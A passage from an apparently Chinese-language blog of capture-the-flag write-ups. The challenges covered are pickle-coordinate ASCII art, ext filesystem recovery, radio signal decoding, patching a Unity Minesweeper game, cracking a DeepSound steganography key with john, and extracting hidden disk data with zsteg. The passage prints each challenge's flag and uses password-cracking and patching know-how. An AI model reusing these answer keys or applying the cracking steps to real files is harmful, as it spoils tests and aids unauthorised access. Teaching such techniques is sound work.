&#39;m&#39;), (61, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;&quot;&#39;), (68, &#39;&quot;&#39;), (75, &#39;#&#39;)], [(1, &#39;m&#39;), (2, &#39;m&#39;), (3, &#39;#&#39;), (4, &#39;m&#39;), (5, &#39;m&#39;), (10, &#39;#&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (31, &#39;#&#39;), (37, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (43, &#39;&quot;&#39;), (47, &#39;&quot;&#39;), (48, &#39;#&#39;), (54, &#39;#&#39;), (55, &#39;&quot;&#39;), (57, &#39;&quot;&#39;), (61, &#39;&quot;&#39;), (62, &#39;#&#39;), (64, &#39;m&#39;), (65, &#39;m&#39;), (66, &#39;#&#39;), (67, &#39;m&#39;), (68, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;m&#39;), (74, &#39;m&#39;), (75, &#39;#&#39;)], [(3, &#39;#&#39;), (10, &#39;#&#39;), (15, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (23, &#39;&quot;&#39;), (25, &#39;&quot;&#39;), (26, &#39;#&#39;), (29, &#39;m&#39;), (30, &#39;m&#39;), (31, &#39;&quot;&#39;), (36, &#39;&quot;&#39;), (40, &#39;#&#39;), (47, &#39;m&#39;), (48, &#39;&quot;&#39;), (53, &#39;m&#39;), (54, &#39;&quot;&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;m&#39;), (62, &#39;&quot;&#39;), (66, &#39;#&#39;), (71, &#39;#&#39;), (72, &#39;&quot;&#39;), (74, &#39;&quot;&#39;), (75, &#39;#&#39;)], [(3, &#39;#&#39;), (10, &#39;#&#39;), (15, &#39;m&#39;), (16, &#39;&quot;&#39;), (17, &#39;&quot;&#39;), (18, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (26, &#39;#&#39;), (31, &#39;#&#39;), (36, &#39;m&#39;), (37, &#39;&quot;&#39;), (38, &#39;&quot;&#39;), (39, &#39;&quot;&#39;), (40, &#39;#&#39;), (45, &#39;m&#39;), (46, &#39;&quot;&#39;), (52, &#39;m&#39;), (53, &#39;&quot;&#39;), (61, &#39;&quot;&#39;), (62, &#39;#&#39;), (66, &#39;#&#39;), (71, &#39;#&#39;), (75, &#39;#&#39;)], [(3, &#39;#&#39;), (10, &#39;&quot;&#39;), (11, &#39;m&#39;), (12, &#39;m&#39;), (15, &#39;&quot;&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;&quot;&#39;), (23, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;&quot;&#39;), (26, &#39;#&#39;), (31, &#39;#&#39;), (36, &#39;&quot;&#39;), (37, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;&quot;&#39;), (40, &#39;#&#39;), (43, &#39;m&#39;), (44, &#39;#&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;m&#39;), (48, &#39;m&#39;), (51, &#39;m&#39;), (52, &#39;&quot;&#39;), (57, &#39;&quot;&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;#&#39;), (62, &#39;&quot;&#39;), (66, &#39;#&#39;), (71, &#39;&quot;&#39;), (72, &#39;#&#39;), (73, &#39;m&#39;), (74, &#39;#&#39;), (75, &#39;#&#39;)], [(23, &#39;m&#39;), (26, &#39;#&#39;), (32, &#39;&quot;&#39;), (33, &#39;&quot;&#39;)], [(24, &#39;&quot;&#39;), (25, &#39;&quot;&#39;)], [], [(12, &#39;#&#39;), (17, &#39;m&#39;), (18, &#39;&quot;&#39;), (19, &#39;&quot;&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (33, &#39;#&#39;), (36, &#39;m&#39;), (37, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (40, &#39;m&#39;), (41, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;m&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (54, &#39;m&#39;), (65, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;m&#39;), (68, &#39;m&#39;), (71, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;m&#39;), (74, &#39;m&#39;), (75, &#39;m&#39;), (76, &#39;m&#39;)], [(2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (12, &#39;#&#39;), (15, &#39;m&#39;), (16, &#39;m&#39;), (17, &#39;#&#39;), (18, &#39;m&#39;), (19, &#39;m&#39;), (22, &#39;&quot;&#39;), (26, &#39;&quot;&#39;), (27, &#39;#&#39;), (30, &#39;m&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;#&#39;), (40, &#39;#&#39;), (41, &#39;&quot;&#39;), (45, &#39;m&#39;), (46, &#39;&quot;&#39;), (47, &#39;#&#39;), (50, &#39;m&#39;), (51, &#39;&quot;&#39;), (55, &#39;&quot;&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (64, &#39;#&#39;), (65, &#39;&quot;&#39;), (68, &#39;&quot;&#39;), (69, &#39;m&#39;), (75, &#39;#&#39;), (76, &#39;&quot;&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;&quot;&#39;), (11, &#39;&quot;&#39;), (12, &#39;#&#39;), (17, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (27, &#39;&quot;&#39;), (29, &#39;#&#39;), (30, &#39;&quot;&#39;), (32, &#39;&quot;&#39;), (33, &#39;#&#39;), (39, &#39;m&#39;), (40, &#39;&quot;&#39;), (44, &#39;#&#39;), (45, &#39;&quot;&#39;), (47, &#39;#&#39;), (50, &#39;#&#39;), (51, &#39;m&#39;), (52, &#39;&quot;&#39;), (53, &#39;&quot;&#39;), (54, &#39;#&#39;), (55, &#39;m&#39;), (57, &#39;#&#39;), (58, &#39;&quot;&#39;), (61, &#39;#&#39;), (64, &#39;#&#39;), (65, &#39;m&#39;), (68, &#39;m&#39;), (69, &#39;#&#39;), (74, &#39;m&#39;), (75, &#39;&quot;&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (3, &#39;&quot;&#39;), (4, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (8, &#39;#&#39;), (12, &#39;#&#39;), (17, &#39;#&#39;), (26, &#39;&quot;&#39;), (27, &#39;#&#39;), (29, &#39;#&#39;), (33, &#39;#&#39;), (38, &#39;m&#39;), (39, &#39;&quot;&#39;), (43, &#39;#&#39;), (44, &#39;m&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;#&#39;), (48, &#39;m&#39;), (50, &#39;#&#39;), (55, &#39;#&#39;), (57, &#39;#&#39;), (58, &#39;&quot;&#39;), (59, &#39;&quot;&#39;), (60, &#39;&quot;&#39;), (61, &#39;&quot;&#39;), (65, &#39;&quot;&#39;), (66, &#39;&quot;&#39;), (67, &#39;&quot;&#39;), (69, &#39;#&#39;), (73, &#39;m&#39;), (74, &#39;&quot;&#39;)], [(1, &#39;&quot;&#39;), (2, &#39;#&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;#&#39;), (10, &#39;m&#39;), (11, &#39;#&#39;), (12, &#39;#&#39;), (17, &#39;#&#39;), (22, &#39;&quot;&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;#&#39;), (27, &#39;&quot;&#39;), (29, &#39;&quot;&#39;), (30, &#39;#&#39;), (31, &#39;m&#39;), (32, &#39;#&#39;), (33, &#39;#&#39;), (37, &#39;m&#39;), (38, &#39;&quot;&#39;), (47, &#39;#&#39;), (51, &#39;#&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (54, &#39;#&#39;), (55, &#39;&quot;&#39;), (57, &#39;&quot;&#39;), (58, &#39;#&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (61, &#39;&quot;&#39;), (64, &#39;&quot;&#39;), (65, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;m&#39;), (68, &#39;&quot;&#39;), (72, &#39;m&#39;), (73, &#39;&quot;&#39;)], [], [], [], [(5, &#39;#&#39;), (8, &#39;#&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (19, &#39;m&#39;), (23, &#39;m&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (30, &#39;m&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (40, &#39;m&#39;), (50, &#39;#&#39;), (57, &#39;#&#39;), (64, &#39;#&#39;), (71, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;m&#39;)], [(2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (15, &#39;#&#39;), (16, &#39;&quot;&#39;), (19, &#39;&quot;&#39;), (20, &#39;m&#39;), (22, &#39;m&#39;), (23, &#39;&quot;&#39;), (26, &#39;&quot;&#39;), (27, &#39;m&#39;), (29, &#39;#&#39;), (34, &#39;#&#39;), (36, &#39;m&#39;), (37, &#39;&quot;&#39;), (41, &#39;&quot;&#39;), (44, &#39;m&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (50, &#39;#&#39;), (51, &#39;m&#39;), (52, &#39;m&#39;), (53, &#39;m&#39;), (57, &#39;#&#39;), (58, &#39;m&#39;), (59, &#39;m&#39;), (60, &#39;m&#39;), (64, &#39;#&#39;), (65, &#39;m&#39;), (66, &#39;m&#39;), (67, &#39;m&#39;), (73, &#39;#&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (4, &#39;&quot;&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;&quot;&#39;), (11, &#39;&quot;&#39;), (12, &#39;#&#39;), (15, &#39;#&#39;), (16, &#39;m&#39;), (19, &#39;m&#39;), (20, &#39;#&#39;), (22, &#39;#&#39;), (25, &#39;m&#39;), (27, &#39;#&#39;), (29, &#39;&quot;&#39;), (30, &#39;m&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;), (34, &#39;&quot;&#39;), (36, &#39;#&#39;), (37, &#39;m&#39;), (38, &#39;&quot;&#39;), (39, &#39;&quot;&#39;), (40, &#39;#&#39;), (41, &#39;m&#39;), (43, &#39;#&#39;), (44, &#39;&quot;&#39;), (47, &#39;#&#39;), (50, &#39;#&#39;), (51, &#39;&quot;&#39;), (53, &#39;&quot;&#39;), (54, &#39;#&#39;), (57, &#39;#&#39;), (58, &#39;&quot;&#39;), (60, &#39;&quot;&#39;), (61, &#39;#&#39;), (64, &#39;#&#39;), (65, &#39;&quot;&#39;), (67, &#39;&quot;&#39;), (68, &#39;#&#39;), (73, &#39;#&#39;)], [(1, &#39;#&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (12, &#39;#&#39;), (16, &#39;&quot;&#39;), (17, &#39;&quot;&#39;), (18, &#39;&quot;&#39;), (20, &#39;#&#39;), (22, &#39;#&#39;), (27, &#39;#&#39;), (29, &#39;#&#39;), (33, &#39;&quot;&#39;), (34, &#39;#&#39;), (36, &#39;#&#39;), (41, &#39;#&#39;), (43, &#39;#&#39;), (44, &#39;&quot;&#39;), (45, &#39;&quot;&#39;), (46, &#39;&quot;&#39;), (47, &#39;&quot;&#39;), (50, &#39;#&#39;), (54, &#39;#&#39;), (57, &#39;#&#39;), (61, &#39;#&#39;), (64, &#39;#&#39;), (68, &#39;#&#39;), (73, &#39;#&#39;)], [(1, &#39;&quot;&#39;), (2, &#39;#&#39;), (3, &#39;m&#39;), (4, &#39;#&#39;), (5, &#39;#&#39;), (8, &#39;#&#39;), (9, &#39;#&#39;), (10, &#39;m&#39;), (11, &#39;#&#39;), (12, &#39;&quot;&#39;), (15, &#39;&quot;&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (19, &#39;&quot;&#39;), (23, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;#&#39;), (29, &#39;&quot;&#39;), (30, &#39;#&#39;), (31, &#39;m&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;), (34, &#39;&quot;&#39;), (37, &#39;#&#39;), (38, &#39;m&#39;), (39, &#39;m&#39;), (40, &#39;#&#39;), (41, &#39;&quot;&#39;), (43, &#39;&quot;&#39;), (44, &#39;#&#39;), (45, &#39;m&#39;), (46, &#39;m&#39;), (47, &#39;&quot;&#39;), (50, &#39;#&#39;), (51, &#39;#&#39;), (52, &#39;m&#39;), (53, &#39;#&#39;), (54, &#39;&quot;&#39;), (57, &#39;#&#39;), (58, &#39;#&#39;), (59, &#39;m&#39;), (60, &#39;#&#39;), (61, &#39;&quot;&#39;), (64, &#39;#&#39;), (65, &#39;#&#39;), (66, &#39;m&#39;), (67, &#39;#&#39;), (68, &#39;&quot;&#39;), (71, &#39;m&#39;), (72, &#39;m&#39;), (73, &#39;#&#39;), (74, &#39;m&#39;), (75, &#39;m&#39;)], [], [], [], [(2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;m&#39;), (8, &#39;m&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (12, &#39;m&#39;), (19, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;m&#39;), (29, &#39;&quot;&#39;), (30, &#39;&quot;&#39;), (31, &#39;m&#39;)], [(1, &#39;#&#39;), (2, &#39;&quot;&#39;), (5, &#39;&quot;&#39;), (6, &#39;m&#39;), (8, &#39;#&#39;), (16, &#39;m&#39;), (17, &#39;m&#39;), (18, &#39;m&#39;), (19, &#39;#&#39;), (22, &#39;m&#39;), (23, &#39;&quot;&#39;), (27, &#39;&quot;&#39;), (31, &#39;#&#39;)], [(1, &#39;#&#39;), (2, &#39;m&#39;), (5, &#39;m&#39;), (6, &#39;#&#39;), (8, &#39;&quot;&#39;), (9, &#39;&quot;&#39;), (10, &#39;&quot;&#39;), (11, &#39;&quot;&#39;), (12, &#39;m&#39;), (13, &#39;m&#39;), (15, &#39;#&#39;), (16, &#39;&quot;&#39;), (18, &#39;&quot;&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (23, &#39;m&#39;), (24, &#39;&quot;&#39;), (25, &#39;&quot;&#39;), (26, &#39;#&#39;), (27, &#39;m&#39;), (31, &#39;&quot;&#39;), (32, &#39;m&#39;), (33, &#39;m&#39;)], [(2, &#39;&quot;&#39;), (3, &#39;&quot;&#39;), (4, &#39;&quot;&#39;), (6, &#39;#&#39;), (13, &#39;#&#39;), (15, &#39;#&#39;), (19, &#39;#&#39;), (22, &#39;#&#39;), (27, &#39;#&#39;), (31, &#39;#&#39;)], [(1, &#39;&quot;&#39;), (2, &#39;m&#39;), (3, &#39;m&#39;), (4, &#39;m&#39;), (5, &#39;&quot;&#39;), (8, &#39;&quot;&#39;), (9, &#39;m&#39;), (10, &#39;m&#39;), (11, &#39;m&#39;), (12, &#39;#&#39;), (13, &#39;&quot;&#39;), (15, &#39;&quot;&#39;), (16, &#39;#&#39;), (17, &#39;m&#39;), (18, &#39;#&#39;), (19, &#39;#&#39;), (23, &#39;#&#39;), (24, &#39;m&#39;), (25, &#39;m&#39;), (26, &#39;#&#39;), (27, &#39;&quot;&#39;), (31, &#39;#&#39;)], [(29, &#39;&quot;&#39;), (30, &#39;&quot;&#39;)]]</span><br></pre></td></tr></table></figure><p>发现其好像是坐标对应得关系，于是写个脚本将其对应出来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line">contents = <span class="built_in">list</span>(pickle.loads(<span class="built_in">open</span>(<span class="string">&quot;extract.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()))</span><br><span class="line"><span class="keyword">for</span> content <span class="keyword">in</span> contents:</span><br><span class="line">    line = <span class="built_in">list</span>(<span class="string">&quot;                                                                             &quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> (x, y) <span class="keyword">in</span> content:</span><br><span class="line">        line[x] = y</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">str</span>(line).replace(<span class="string">&quot;\&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;, &quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;[&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;]&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>可以得到如下内容。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">  m&quot;&quot;  &quot;&quot;#                    m&quot;&quot;          mmmm  mmmmmm  mmmm    m&quot;&quot;      # </span><br><span class="line">mm#mm    #     mmm    mmmm    #     mmm   &quot;   &quot;#     #&quot; &quot;   &quot;# mm#mm   mmm# </span><br><span class="line">  #      #    &quot;   #  #&quot; &quot;#  mm&quot;    &quot;   #      m&quot;    m&quot;    mmm&quot;   #    #&quot; &quot;# </span><br><span class="line">  #      #    m&quot;&quot;&quot;#  #   #    #    m&quot;&quot;&quot;#    m&quot;     m&quot;       &quot;#   #    #   # </span><br><span class="line">  #      &quot;mm  &quot;mm&quot;#  &quot;#m&quot;#    #    &quot;mm&quot;#  m#mmmm  m&quot;    &quot;mmm#&quot;   #    &quot;#m## </span><br><span class="line">                      m  #     &quot;&quot;                                           </span><br><span class="line">                       &quot;&quot;                                                   </span><br><span class="line">                                                                            </span><br><span class="line">           #    m&quot;&quot;   mmmm      #  mmmmmm    mm    mmm          mmmm  mmmmmm</span><br><span class="line"> mmm    mmm#  mm#mm  &quot;   &quot;#  mmm#      #&quot;   m&quot;#  m&quot;   &quot;  mmm   #&quot;  &quot;m     #&quot;</span><br><span class="line">#&quot;  #  #&quot; &quot;#    #      mmm&quot; #&quot; &quot;#     m&quot;   #&quot; #  #m&quot;&quot;#m #&quot;  #  #m  m#    m&quot; </span><br><span class="line">#&quot;&quot;&quot;&quot;  #   #    #        &quot;# #   #    m&quot;   #mmm#m #    # #&quot;&quot;&quot;&quot;   &quot;&quot;&quot; #   m&quot;  </span><br><span class="line">&quot;#mm&quot;  &quot;#m##    #    &quot;mmm#&quot; &quot;#m##   m&quot;        #   #mm#&quot; &quot;#mm&quot;  &quot;mmm&quot;   m&quot;   </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line">    #  #       mmmm   mmmm   mmmm    mmm         #      #      #      mmm   </span><br><span class="line"> mmm#  #mmm   #&quot;  &quot;m m&quot;  &quot;m #    # m&quot;   &quot;  mmm   #mmm   #mmm   #mmm     #   </span><br><span class="line">#&quot; &quot;#  #&quot; &quot;#  #m  m# #  m # &quot;mmmm&quot; #m&quot;&quot;#m #&quot;  #  #&quot; &quot;#  #&quot; &quot;#  #&quot; &quot;#    #   </span><br><span class="line">#   #  #   #   &quot;&quot;&quot; # #    # #   &quot;# #    # #&quot;&quot;&quot;&quot;  #   #  #   #  #   #    #   </span><br><span class="line">&quot;#m##  ##m#&quot;  &quot;mmm&quot;   #mm#  &quot;#mmm&quot;  #mm#&quot; &quot;#mm&quot;  ##m#&quot;  ##m#&quot;  ##m#&quot;  mm#mm </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line">                                                                            </span><br><span class="line"> mmmm  mmmmm      #    mmm  &quot;&quot;m                                             </span><br><span class="line">#&quot;  &quot;m #       mmm#  m&quot;   &quot;   #                                             </span><br><span class="line">#m  m# &quot;&quot;&quot;&quot;mm #&quot; &quot;#  #m&quot;&quot;#m   &quot;mm                                           </span><br><span class="line"> &quot;&quot;&quot; #      # #   #  #    #   #                                             </span><br><span class="line">&quot;mmm&quot;  &quot;mmm#&quot; &quot;#m##   #mm#&quot;   #                                             </span><br><span class="line">                            &quot;&quot;                                              </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a273fdedf3d746e97db9086ebbb195d6&#125;</span><br></pre></td></tr></table></figure><h3 id="XMAN2018排位赛-file"><a href="#XMAN2018排位赛-file" class="headerlink" title="[XMAN2018排位赛]file"></a>[XMAN2018排位赛]file</h3><p>附件给出的是一个镜像，使用 DiskInternals Linux Reader 挂载打开可以发现一个 lost+found 文件夹，说明存在可能可恢复的文件数据碎片。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618503187703.8fd9dca120e1ab04cc09bcbcddf3d10a1a2216eb.png"></p><p>使用 <code>extundelete attachment.img --restore-all</code> 尝试恢复即可得到一个 Vim 的 swp 文件。将其恢复后整理可得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;fugly_cats_need_luv_2&#125;</span><br></pre></td></tr></table></figure><h3 id="HDCTF2019-信号分析"><a href="#HDCTF2019-信号分析" class="headerlink" title="[HDCTF2019]信号分析"></a>[HDCTF2019]信号分析</h3><blockquote><p>使用HackCube-Special分析固定码信号：<a href="https://www.freebuf.com/articles/wireless/191534.html">https://www.freebuf.com/articles/wireless/191534.html</a></p></blockquote><p>将附件使用 Audition 打开可以看到如下重复波形。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618507217657.744aad767e7ff22b3c3e9f1816def3130c733761.png"></p><p>根据参考文章的如下图片可以尝试解码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618507302968.d7b7cff9ac0bef89dd43ddbf37ecd407008cbb45.png"></p><p>根据图片规律可解码得到 <code>FFFFFFFF0001</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;FFFFFFFF0001&#125;</span><br></pre></td></tr></table></figure><h3 id="De1CTF2019-Mine-Sweeping"><a href="#De1CTF2019-Mine-Sweeping" class="headerlink" title="[De1CTF2019]Mine Sweeping"></a>[De1CTF2019]Mine Sweeping</h3><p>解压附件可得到一个游戏，使用 dnSpy 查看 <code>Assembly-CSharp.dll</code> 可以找到 <code>OnMouseUpAsButton()</code> 方法，其中存在着判断每次点击是否“踩雷”的操作。要完成游戏只需要点开所有方块即可，因此只需要把“踩雷”去掉。将原有的代码修改如下。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Elements</span></span><br><span class="line"><span class="comment">// Token: 0x0600000A RID: 10</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">OnMouseUpAsButton</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!Grids._instance.bGameEnd &amp;&amp; !<span class="keyword">this</span>.bIsOpen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">this</span>.bIsOpen = <span class="literal">true</span>;</span><br><span class="line"><span class="built_in">int</span> num = (<span class="built_in">int</span>)<span class="keyword">base</span>.transform.position.x;</span><br><span class="line"><span class="built_in">int</span> num2 = (<span class="built_in">int</span>)<span class="keyword">base</span>.transform.position.y;</span><br><span class="line"><span class="built_in">int</span> adjcent = Grids._instance.CountAdjcentNum(num, num2);</span><br><span class="line"><span class="keyword">this</span>.SafeAndThunder(adjcent);</span><br><span class="line">Grids._instance.Flush(num, num2, <span class="keyword">new</span> <span class="built_in">bool</span>[<span class="number">29</span>, <span class="number">29</span>]);</span><br><span class="line"><span class="keyword">if</span> (Grids._instance.GameWin())</span><br><span class="line">&#123;</span><br><span class="line">Grids._instance.bGameEnd = <span class="literal">true</span>;</span><br><span class="line">MonoBehaviour.print(<span class="string">&quot;game over: win&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译后保存，再次打开游戏并点开所有方块即可得到如下二维码。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618558212529.5018a4be2b010ac4b82809c47f6282cac0ca1427.png@300w"></p><p>扫描二维码可得到 <code>http://qr02.cn/FeJ7dU</code>，访问即可获得 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">de1ctf&#123;G3t_F1@g_AFt3R_Sw3ep1ng_M1n3s&#125;</span><br></pre></td></tr></table></figure><h3 id="INSHack2018-not-so-deep"><a href="#INSHack2018-not-so-deep" class="headerlink" title="[INSHack2018](not) so deep"></a>[INSHack2018](not) so deep</h3><p>使用 Audition 打开附件可以发现半个 flag。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618559097680.2d01f9162a4b68c8a2610f15937f58561a786778.png"></p><p>根据其中含有的 st3G4n 推测是隐写，同时题目中有 deep，考虑是 DeepSound。但是没有给出 key，因此尝试使用 john 自带的 deepsound2john.py 来得到 hash 值从而爆破 key。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; python .\run\deepsound2john.py .\final_flag.wav</span><br><span class="line">final_flag.wav:$dynamic_1529<span class="variable">$b8f858d9deb0b805797cef03299e3bdd8990f48a</span></span><br></pre></td></tr></table></figure><p>使用 john 爆破可以得到如下结果。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">azerty           (final_flag.wav)</span><br></pre></td></tr></table></figure><p>因此得到了 key 为 azerty。使用 DeepSound 配合 key 解密可得一个文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618559638907.05db2068ee3850ca47334f5f4a409f243230c0e7.png"></p><p>提取出 flag2.txt 可得后一半 flag <code>0_1s_4lwayS_Th3_S4me&#125;</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSA&#123;Aud1o_st3G4n0_1s_4lwayS_Th3_S4me&#125;</span><br></pre></td></tr></table></figure><h3 id="BSidesSF2019-diskimage"><a href="#BSidesSF2019-diskimage" class="headerlink" title="[BSidesSF2019]diskimage"></a>[BSidesSF2019]diskimage</h3><p>附件是一张图片，上半部分显示不正常，考虑有隐写。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618559941227.a75a5eb87399e52e8c3978f4f2f106075975fd39.png@50q" alt="image-20210416155900562"></p><p>在 zsteg 的报告下有如下信息。</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8,rgb,lsb,xy       .. file: DOS&#x2F;MBR boot sector, code offset 0x3c+2, OEM-ID &quot;~mitsumi&quot;, root entries 224, sectors 2880 (volumes &lt;&#x3D;32 MB) , sectors&#x2F;FAT 9, sectors&#x2F;track 18, serial number 0x7e572f0f, unlabeled, FAT (12 bit)</span><br></pre></td></tr></table></figure><p>将文件提取出来 <code>zsteg -e &#39;b8,rgb,lsb,xy&#39; attachment.png  &gt; extracted.dat </code>，可以得到一个软盘数据文件。使用 testdisk 指令尝试恢复被删除的文件。</p><p><img src="https://butter.lumosary.workers.dev/images/archive/4df72543-170c-4dff-a021-5bc0cff9f636/1618561398231.18575ce83e848c1b7f9555d8882a50979c8bff60.png"></p><p><img 